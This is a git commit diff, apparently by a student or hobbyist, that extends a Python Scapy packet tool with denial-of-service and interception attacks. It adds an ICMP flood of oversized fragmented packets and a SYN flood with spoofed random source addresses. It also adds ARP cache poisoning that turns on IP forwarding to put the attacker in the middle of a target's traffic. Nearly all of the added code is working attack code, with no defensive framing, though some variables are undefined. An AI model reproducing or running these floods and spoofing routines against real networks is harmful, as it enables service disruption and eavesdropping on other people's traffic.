7c4e9009b885d5399452f9e074452f19156cdd62
vascopac <vascopac@hotmail.com>
2021-01-25 02:50:33 +0000

    Várias funções colocadas, falta acertos finais

--- file.py
+++ file.py
@@ -14,16 +14,21 @@ parser = argparse.ArgumentParser()
 # Adding optional argument
 parser.add_argument("-i", "--ip", help = "Destination IP Address")
 parser.add_argument("-s", "--source", help = "Source IP Address")
-parser.add_argument("-p", "--protocol", help = "Protocol name")
+parser.add_argument("--icmp", help = "ICMP Flood")
+parser.add_argument("--syn", help = "SYN Flood")
+parser.add_argument("--arp", help = "ARP Spoofing")
 parser.add_argument("-n", "--number", help = "Number of packets")
 parser.add_argument("-f", "--file", type=argparse.FileType('r'), help = "File with destination IP Addresses")
 
 
 # Read arguments from command line
-args = parser.parse_args()
+args = parser.parse_args() 
 
-#threads 
+"""
+---------FUNCTIONS---------
+"""
 
+#threads
 def thread_delay(thread_name, delay, ip):
 	time.sleep(delay)
 
@@ -50,8 +55,63 @@ def thread_delay(thread_name, delay, ip):
 		send(packet, loop=1)
 
 
+#enable ip route (ip forward) in linux-based distro
+def _enable_linux_iproute():
+	file_path = "/proc/sys/net/ipv4/ip_forward"
+	with open(file_path) as f:
+		if f.read() == 1:
+			#already enabled
+			return
+	with open(file_path, "w") as f:
+		print(1, file=f)
 
+def enable_ip_route(verbose=True):
+	if verbose:
+		print("[!] Enabling IP Routing...")
+	_enable_linux_iproute()
+	if verbose:
+		print("[!] IP Routing enabled.")
+		
+def get_mac(ip):
+	"""
+	Returns MAC address of any device connected to the network
+	If ip is down, returns None instead
+	"""
+	ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
+	if ans:
+		return ans[0][1].src
+	
+def spoof(target_ip, host_ip, verbose=True):
+	"""
+	Spoofs `target_ip` saying that we are `host_ip`.
+	it is accomplished by changing the ARP cache of the target (poisoning)
+	"""
+	#get the mac of target
+	target_mac=get_mac(target_ip)
+	
+	arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
+	
+	send(arp_response, verbose=0)
+	
+	if verbose:
+		self_mac = ARP().hwsrc
+		print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))
+		
+def restore(target_ip, host_ip, verbose=True):
+	#get the real MAC of target
+	target_mac = get_mac(target_ip)
+	#get the real Mac of spoofed
+	host_mac = get_mac(host_ip)
+	#crafting the restoring packet
+	arp_response = ARP(pdst=target_ip,hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
+	#send the restore packet 7 times
+	send(arp_response, verbose=0, count=7)
+	if verbose:
+		print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))
 
+"""
+--------------//-------------------------------
+"""
 if args.ip:
 	try:
 		ip = ipaddress.ip_address(args.ip)
@@ -66,8 +126,9 @@ if args.ip:
 		print("Diplaying source as: % s" % args.source)
 		ip_layer = IP(dst=args.ip, src=args.source)
 	else:
-		ip_layer = IP(dst=args.ip)
+		ip_layer = IP(dst=args.ip, src=RandIP("192.168.10.10/24"))
 
+	"""
 	if args.protocol:
 		print("Diplaying protocol as: % s" % args.protocol)
 
@@ -78,11 +139,47 @@ if args.ip:
 
 	packet = ip_layer / layer
 
+	"""
+
 	if args.number:
-		send(packet, count=int(args.number))
+		numPackets = args.number
 
 	else:
-		send(packet, loop=1)
+		numPackets = 50
+	
+
+	if args.icmp:
+		send(numPackets*(fragment(ip_layer/ICMP()/"X"*60000)))
+
+	if args.syn:
+		tcp=TCP(sport=RandShort(), dport=80, flags="S")
+		raw=Raw(b"x"*1024)
+		p=ip_layer/tcp/raw
+		send(p, loop=1, verbose=0)
+
+	if args.arp:
+		if args.host: #METER UM ELSE A DIZER QUE ESTE HOST É OBRIGATORIO NO ARP
+			try:
+				gtw = ipaddress.ip_address(args.host)
+			except:
+				print('Address/netmask is invalid: %s' % args.host)
+				exit(1)
+
+			verbose = True
+			enable_ip_route()
+			try:
+				while True:
+					#telling the target that we are the host
+					spoof(ip, host, verbose)
+					#telling the host that we are the target
+					spoof(host, ip, verbose)
+					time.sleep(1)
+			except KeyboardInterrupt:
+				print("[!] Detected CTRL+C ! restoring the network, please wait...")
+				restore(target, host)
+				restore(host, target)
+			
+	
 
 else:
 	if args.file:
